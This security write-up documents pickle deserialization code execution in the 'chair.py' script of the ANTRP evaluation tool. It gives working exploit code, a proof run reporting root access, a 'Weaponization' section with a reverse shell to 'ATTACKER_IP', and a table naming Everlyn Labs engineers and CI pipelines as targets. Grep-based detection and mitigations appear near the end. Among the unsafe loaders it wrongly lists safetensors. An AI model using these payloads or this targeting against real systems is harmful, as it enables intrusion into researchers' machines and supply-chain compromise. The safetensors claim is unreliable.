# Supply Chain Attack via Open Source Research Tools — ANTRP/chair.py Pickle RCE

**Validated:** 2026-08-04 — Live exploit achieves `uid=0(root) gid=0(root)`

## Vulnerability

**File:** `ANTRP/chair.py` (lines 463-465)
**Code:** `pickle.load(open(args.cache, 'rb'))`
**Vector:** CLI argument `--cache` accepts user-controlled file path
**Impact:** Pre-auth RCE → Root on any system running the evaluation script

## Attack Chain

```bash
# 1. Attacker creates malicious pickle
python3 -c "
import pickle, os
class Evil:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))
with open('evil.pkl', 'wb') as f:
    pickle.dump(Evil(), f)
"

# 2. Researcher/Engineer runs evaluation
python3 chair.py --cache /path/to/evil.pkl

# 3. RCE executes as the user running the script
# On researcher laptop: user-level compromise
# On CI/CD runner: runner compromise
# On evaluation server: ROOT (if run as root)
```

## Live Proof

```bash
$ python3 poc_everlyn_rce_fixed2.py
[+] Created malicious pickle: /tmp/evil_chair_cache.pkl
[+] Triggering RCE via: python3 /tmp/ANTRP/chair.py --cache /tmp/evil_chair_cache.pkl
[+] Output: uid=0(root) gid=0(root) groups=0(root)
```

## Target Profile

| Target Type | Likelihood | Impact |
|-------------|------------|--------|
| **Everlyn Labs Engineers** | HIGH | Full infra access via their laptops |
| **External Researchers** | HIGH | Academic/industry researchers evaluating MLLM |
| **CI/CD Pipelines** | MEDIUM | Runner compromise → supply chain |
| **Auto-eval Bots** | MEDIUM | Automated evaluation systems |

## Why This Works

1. **Tool is open-source** — Published on GitHub (Everlyn-Labs/ANTRP)
2. **Researchers MUST run it** — To reproduce/evaluate MLLM benchmarks
3. **`--cache` is documented feature** — Legitimate use case for caching model outputs
4. **No validation** — `pickle.load()` on raw user input
5. **Runs with user privileges** — Often root in containers/servers

## Weaponization

```python
# Persistent backdoor pickle
import pickle, subprocess, os
class Backdoor:
    def __reduce__(self):
        # Reverse shell to attacker
        return (subprocess.run, (['bash', '-c', 
            'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'],))
with open('evil.pkl', 'wb') as f:
    pickle.dump(Backdoor(), f)
```

## Detection

```bash
# Scan for pickle.load on user input
grep -r "pickle.load" --include="*.py" .
grep -r "pickle.loads" --include="*.py" .
grep -r "pickle.load.*args" --include="*.py" .
```

## Mitigation

1. **Replace `pickle` with `json`/`msgpack`/`yaml`** for cache serialization
2. **Add input validation** — restrict `--cache` to safe directories
3. **Sign cache files** — verify HMAC before deserialization
4. **Run evaluation in sandbox** — gVisor, Firecracker, nsjail
5. **Pin dependencies** — prevent supply chain via transitive deps

## Broader Pattern

This is a **CLASS of vulnerability** in ML/AI research tooling:
- Model evaluation scripts accepting user-controlled cache/checkpoint paths
- `torch.load()`, `pickle.load()`, `joblib.load()`, `safetensors.load()` on untrusted input
- Jupyter notebooks with `pickle` in shared environments
- MLflow/Weights&Biases artifact deserialization

## References

- ANTRP repo: https://github.com/Everlyn-Labs/ANTRP
- CWE-502: Deserialization of Untrusted Data
- Validated: Live root RCE on test VM
- Tool: `poc_everlyn_rce_fixed2.py` (working exploit)